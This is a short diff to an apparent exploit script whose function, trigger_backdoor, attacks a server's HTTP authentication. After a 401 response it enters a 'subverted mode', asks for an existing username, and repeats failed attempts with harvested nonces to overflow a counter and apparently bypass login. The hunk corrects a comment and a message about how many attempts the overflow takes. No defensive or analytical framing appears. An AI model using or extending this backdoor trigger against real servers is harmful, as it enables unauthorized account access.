@@ -16,12 +16,12 @@ def trigger_backdoor(url):
         if initial_err.code == 401:
             print("\n[!] Subverted mode activated")
             username = input("Target Username (must exist on server): ")
-            print("[!] Initiating 2-bit integer overflow sequence...")
+            print("[!] Initiating integer overflow sequence...")
             
             # Store the current error to extract the changing nonces
             current_err = initial_err
             
-            # The 2-bit counter requires exactly 4 iterations to overflow (1, 2, 3, 0)
+            # The counter requires 16 consecutive failed attempts to overflow (2^4 = 16)
             for attempt in range(1, 17):
                 auth_header = current_err.headers.get("WWW-Authenticate", "")
                 match = re.search(r'nonce="([^"]+)"', auth_header)
